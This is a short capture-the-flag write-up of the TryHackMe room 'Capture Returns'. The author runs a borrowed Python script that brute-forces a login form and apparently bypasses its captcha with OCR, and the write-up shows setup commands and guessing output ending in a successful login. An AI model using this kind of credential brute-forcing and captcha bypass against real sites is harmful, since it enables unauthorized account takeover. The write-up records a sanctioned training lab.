<p>July 15, 2025 - Day 435</p>
<h1>Capture Returns</h1>
<p><em>The developers have improved their login form since last time. Can you bypass it?</em>.<br>
https://tryhackme.com/room/capturereturns<br>
<p>Capture Returns is part of my 435ᵗʰ day on TryHackMe. It is classified as a hard-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click the link below, and let's get started!</p>

<br>

<img width="1897" height="376" alt="image" src="https://github.com/user-attachments/assets/9695822e-67ca-4164-ba87-1073c0b6f812" />

<br>

<p>
  
  
- used the Python code crafted here: https://github.com/Kript0r3x/caturereturns/tree/main<br>
- substituted TargetIP<br>
- installed some modules
- renamed usernames.txt --> usernme.txt<br>
- renamed passwords.txt --> password.txt</p>


```bash
:~/returns# ls
exploit.py  password.txt  response.txt  username.txt
```

```bash
pip3 install Pillow
...
pip3 install opencv-python
...
pip3 install pytesseract
```

```bash
:~/returns# python3 exploit.py
...
945 Trying ------------------ Username ----------: sherri, ----------- password: nancy
946 Trying ------------------ Username ----------: sherri, ----------- password: nugget
947 Trying ------------------ Username ----------: sherri, ----------- password: bintang
948 Trying ------------------ Username ----------: sherri, ----------- password: judith
949 Trying ------------------ Username ----------: sherri, ----------- password: forever1
950 Trying ------------------ Username ----------: sherri, ----------- password: shirley
951 Trying ------------------ Username ----------: sherri, ----------- password: inferno
952 Trying ------------------ Username ----------: sherri, ----------- password: delete
953 Trying ------------------ Username ----------: sherri, ----------- password: 8675309
954 Trying ------------------ Username ----------: sherri, ----------- password: fearless
955 Trying ------------------ Username ----------: sherri, ----------- password: amigos
956 Trying ------------------ Username ----------: sherri, ----------- password: april
...
Login successful.
```

```bash
:~/returns# cat response.txt
```


<img width="920" height="348" alt="image" src="https://github.com/user-attachments/assets/bef34c53-6411-4157-ae6a-552a6840d15e" />

<img width="787" height="119" alt="image" src="https://github.com/user-attachments/assets/41985052-5dfb-40f6-a611-55b245dbc3e3" />


<br>
<br>

<img width="1904" height="878" alt="image" src="https://github.com/user-attachments/assets/4d2d5a6e-f521-4666-9196-4846d8620a85" />

<img width="1896" height="907" alt="image" src="https://github.com/user-attachments/assets/647a15ee-d2b4-43cf-a628-495a577a3e68" />

<br>
<br>


<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 15, 2025     | 435      |     156ᵗʰ    |      5ᵗʰ     |    205ᵗʰ    |     7ᵗʰ    | 114,961  |    860    |    71     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/a2dbd094-19b6-4ae9-b121-e6571d3152cb" />

<img width="1891" height="898" alt="image" src="https://github.com/user-attachments/assets/5e3bc5ba-722b-4818-9ace-05d1020840db" />

<img width="1880" height="885" alt="image" src="https://github.com/user-attachments/assets/5afd962a-a725-4e6b-b6c6-e6d3a803482c" />

<img width="1891" height="891" alt="image" src="https://github.com/user-attachments/assets/45e87799-9f90-4f8b-ab8b-0b7fd2ada395" />

<img width="1885" height="886" alt="image" src="https://github.com/user-attachments/assets/48eaf69e-4c60-41cb-9679-b6751016113c" />
